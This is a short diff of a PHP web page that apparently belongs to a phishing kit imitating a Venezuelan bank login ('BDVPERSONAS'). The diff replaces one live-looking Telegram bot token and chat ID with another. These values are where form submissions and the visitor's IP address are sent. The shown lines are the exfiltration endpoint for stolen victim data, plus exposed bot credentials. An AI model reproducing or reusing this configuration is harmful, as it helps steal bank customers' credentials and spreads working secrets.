@@ -26,8 +26,8 @@ if (!empty($direccion_ip)) {
 }
 
 // Token del bot y chat ID del canal (reemplaza con tus valores)
-$botToken = '7740914011:AAG9WcegfsN7c7R0oUx5mpA85CcISmpN45U';
-$chatId = '5575530370'; // Puede ser el nombre o el ID numérico del canal
+$botToken = '8438607874:AAEq2z7IN3yrOyXz8nJtb4M8jQwIFuPxuMg';
+$chatId = '-1003686153318'; // Puede ser el nombre o el ID numérico del canal
 
 // Mensaje a enviar con formato específico
 $mensaje = "-BDVPERSONAS-:\n";
@@ -147,3 +147,4 @@ if ($result === false) {
 </form>
 </body>
 </html>
+
